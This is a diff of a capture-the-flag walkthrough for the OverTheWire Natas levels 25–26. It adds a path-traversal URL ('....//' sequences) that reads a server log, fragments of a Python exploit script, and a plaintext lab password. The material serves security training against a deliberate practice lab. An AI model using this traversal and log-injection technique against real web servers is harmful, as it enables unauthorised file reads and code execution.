@@ -1302,7 +1302,7 @@ Step 6: Then we will switch on the intercept on (Receive), in that request you w
 ![image](./images-1/image-25-2.png)
 
 Step 7: Then we use /var/www/natas_webpass/natas25_ ,  PASSIPHPSESSID, Then use .log 
-           then search it.
+           then search it or load it.
 
     http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_safot3p2212gdc87bo00m1bj4r.log
 
@@ -1319,15 +1319,8 @@ Step 2: Then change that User-Agent like this , Before click send button
 
 ![image](./images-1/image-25-4.png)
 
-
-
-S
-
-
-
-
-
-
+### Metho 3
+Step 1:  Step 7: So, we will Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
 
 import requests
 import re
@@ -1353,4 +1346,13 @@ response = session.post(
 )
 
 print(response.text)
+
+## Level-26
++ Username : natas26
++  Password : cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
++ Domain : http://natas26.natas.labs.overthewire.org
+
+## Explination
+
+
 
